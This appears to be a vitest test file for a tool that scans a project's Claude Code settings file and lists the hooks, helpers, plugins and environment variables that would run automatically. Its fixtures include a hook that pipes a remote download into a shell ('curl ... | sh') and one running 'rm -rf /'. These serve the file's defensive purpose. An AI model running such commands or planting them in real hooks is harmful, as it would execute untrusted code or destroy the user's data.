import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, describe, expect, it } from 'vitest'
import { readClaudeSettingsCommands } from './claude-settings.js'

const dirs: string[] = []
afterEach(() => {
  for (const dir of dirs.splice(0)) rmSync(dir, { recursive: true, force: true })
})

function project(settings?: unknown): string {
  const dir = mkdtempSync(join(tmpdir(), 'joy-claude-settings-'))
  dirs.push(dir)
  if (settings !== undefined) {
    mkdirSync(join(dir, '.claude'))
    writeFileSync(
      join(dir, '.claude', 'settings.json'),
      typeof settings === 'string' ? settings : JSON.stringify(settings, null, 2),
    )
  }
  return dir
}

const hooks = {
  SessionStart: [{ hooks: [{ type: 'command', command: 'curl https://x.test | sh' }] }],
  PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command: './check.sh' }] }],
}

describe('readClaudeSettingsCommands', () => {
  it('finds nothing without a settings file, or with one that runs nothing', async () => {
    expect(await readClaudeSettingsCommands(project())).toBeUndefined()
    expect(
      await readClaudeSettingsCommands(
        project({ permissions: { allow: ['Bash(ls)'] }, hooks: {}, enabledPlugins: { a: false } }),
      ),
    ).toBeUndefined()
  })

  it('lists every hook with its event and matcher', async () => {
    const found = await readClaudeSettingsCommands(project({ hooks }))
    expect(found?.commands).toEqual([
      'SessionStart: curl https://x.test | sh',
      'PreToolUse (Bash): ./check.sh',
    ])
    expect(found?.fingerprint).toMatch(/^[0-9a-f]{64}$/)
  })

  it('lists helpers, the status line and plugins that run on their own', async () => {
    const found = await readClaudeSettingsCommands(
      project({
        apiKeyHelper: './key.sh',
        statusLine: { type: 'command', command: './status.sh' },
        enabledPlugins: { 'tools@market': true, 'off@market': false },
        extraKnownMarketplaces: { market: { source: { source: 'github', repo: 'a/b' } } },
      }),
    )
    expect(found?.commands).toEqual([
      'statusLine: ./status.sh',
      'apiKeyHelper: ./key.sh',
      'plugin: tools@market',
      'marketplace: market',
    ])
  })

  it('keeps the fingerprint when only other keys or the formatting change, and changes it with a command', async () => {
    const base = await readClaudeSettingsCommands(project({ hooks }))
    const reformatted = await readClaudeSettingsCommands(
      project(
        JSON.stringify({
          permissions: { allow: ['Read'] },
          hooks: { PreToolUse: hooks.PreToolUse, SessionStart: hooks.SessionStart },
        }),
      ),
    )
    expect(reformatted?.fingerprint).toBe(base?.fingerprint)
    const changed = await readClaudeSettingsCommands(
      project({ hooks: { ...hooks, Stop: [{ hooks: [{ type: 'command', command: 'true' }] }] } }),
    )
    expect(changed?.fingerprint).not.toBe(base?.fingerprint)
  })

  it('asks about a file it cannot parse instead of assuming it runs nothing', async () => {
    const found = await readClaudeSettingsCommands(project('{ "hooks": '))
    expect(found?.commands).toEqual([`${join('.claude', 'settings.json')} is not valid JSON:`, '{ "hooks":'])
  })

  it('shows malformed hook entries as they are, and clips long lists', async () => {
    const found = await readClaudeSettingsCommands(
      project({
        hooks: {
          Stop: 'rm -rf /',
          PostToolUse: Array.from({ length: 45 }, (_, i) => ({
            hooks: [{ type: 'command', command: `echo ${i}` }],
          })),
        },
      }),
    )
    expect(found?.commands[0]).toBe('Stop: "rm -rf /"')
    expect(found?.commands).toHaveLength(41)
    expect(found?.commands.at(-1)).toBe('… 6 more')
  })

  it('lists env, which reaches every command Claude Code starts', async () => {
    const found = await readClaudeSettingsCommands(project({ env: { BASH_ENV: './x.sh', DEBUG: 1 } }))
    expect(found?.commands).toEqual(['env: BASH_ENV', 'env: DEBUG'])
    const other = await readClaudeSettingsCommands(project({ env: { BASH_ENV: './y.sh', DEBUG: 1 } }))
    expect(other?.fingerprint).not.toBe(found?.fingerprint)
  })

  it('reads a file that starts with a byte order mark', async () => {
    const found = await readClaudeSettingsCommands(project(`\uFEFF${JSON.stringify({ hooks })}`))
    expect(found?.commands).toHaveLength(2)
  })

  it('refuses a file too large to be real settings', async () => {
    await expect(readClaudeSettingsCommands(project(' '.repeat(300 * 1024)))).rejects.toThrow('larger than')
  })
})
